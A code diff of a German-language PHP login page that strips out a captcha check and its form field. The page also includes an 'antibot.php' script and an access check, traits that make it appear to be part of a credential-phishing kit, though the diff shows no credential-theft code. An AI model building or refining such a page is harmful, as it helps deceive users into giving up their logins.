@@ -1,12 +1,7 @@
 <?php
 session_start();
 
-// Include captcha
-if (file_exists('../captcha.php')) {
-    include '../captcha.php';
-} else {
-    include './captcha.php';
-}
+// Captcha removed - no longer needed
  
 // Fix include paths when accessed from views directory
 if (file_exists('../antibot.php')) {
@@ -558,24 +553,7 @@ if (checkAccess()) {
 									<span class="close">x</span>
 								</div>
 
-								<!-- Captcha Field -->
-								<div class="form-row label-pos-none field-length-full">
-									<label for="captcha">Sicherheitsfrage</label>
-									<div class="input">
-										<div style="margin-bottom: 10px; padding: 10px; background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px;">
-											<strong><?php echo getCurrentCaptcha(); ?></strong>
-										</div>
-										<input class="text-left required" type="text" required="required" id="captcha" name="captcha" autocomplete="off" maxlength="10" tabindex="3" data-h5-errorid="invalid-captcha" value="" placeholder="Ihre Antwort">
-										
-										<?php if (isset($_SESSION['captcha_error'])): ?>
-										<div class="error-msg" id="invalid-captcha" style="display: block;">
-											<div class="inner">
-												<p>Falsche Antwort. Bitte versuchen Sie es erneut.</p>
-											</div>
-										</div>
-										<?php unset($_SESSION['captcha_error']); endif; ?>
-									</div>
-								</div>
+								<!-- Captcha removed -->
 
 								<button id="doordior"  name="doordior" class="b-01 b-a-04 b-g-01 login" type="submit" tabindex="4">
 									Login
